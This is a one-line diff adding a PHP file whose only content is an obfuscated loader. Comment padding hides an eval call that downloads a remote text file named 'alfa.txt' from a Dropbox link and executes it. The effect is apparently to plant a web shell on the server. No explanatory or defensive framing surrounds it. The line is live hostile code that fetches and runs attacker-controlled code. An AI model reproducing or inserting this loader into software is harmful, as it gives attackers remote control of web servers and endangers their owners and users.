@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://www.dropbox.com/s/wio5a0p8cl9n97u/alfa.txt?raw=1"));/**/?>
